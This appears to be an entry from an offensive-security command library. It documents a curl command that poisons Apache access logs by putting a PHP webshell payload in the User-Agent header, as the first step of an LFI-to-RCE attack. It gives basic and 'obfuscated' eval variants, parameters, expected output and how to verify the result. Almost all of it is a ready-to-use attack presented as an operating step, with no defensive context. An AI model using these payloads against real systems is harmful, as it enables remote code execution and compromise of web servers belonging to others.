---
id: 6517b030-5a27-4b00-8e68-1cb2adc4216c
name: curl-poison-apache-user-agent
type: command
executor: bash
data: 'curl -A "<?php system(\\$_GET[''cmd'']); ?>" $_TARGET_URL'
output: null
created_at: '2023-04-06T03:55:54.012204+00:00'
updated_at: '2023-04-06T03:55:54.027705+00:00'
platforms:
  - Linux
tags:
  - lfi
  - rce
  - apache
verified: true
validated: true
---

# curl-poison-apache-user-agent

## Command

```bash
curl -A "<?php system(\\$_GET['cmd']); ?>" $_TARGET_URL
```

## Description

This command uses curl to send an HTTP GET request to the target URL with a malicious PHP payload in the User-Agent header (-A flag). The payload is designed to create a simple webshell in the server logs, enabling RCE when the log is included via LFI. Use this in the poisoning phase of log-based RCE attacks against Apache/PHP setups.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -A | Sets the User-Agent header to the PHP payload | Yes |
| $_TARGET_URL | The target web server's URL (e.g., http://example.com/) | Yes |

## Examples

### Basic Usage

```bash
curl -A "<?php system(\\$_GET['cmd']); ?>" http://target.example.com/
```

### Advanced Usage

For a more obfuscated payload or HTTPS:

```bash
curl -k -A "<?php eval(\\$_GET['c']); ?>" https://target.example.com/
```

## Expected Output

Standard HTTP response from the server, such as:

```
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>Homepage content</body>
</html>
```

No direct output shows poisoning; verify indirectly by checking the log file on the server or proceeding to LFI inclusion.

## Related

- [[procedures/RCE-via-Poisoned-User-Agent-in-Apache-Logs]]
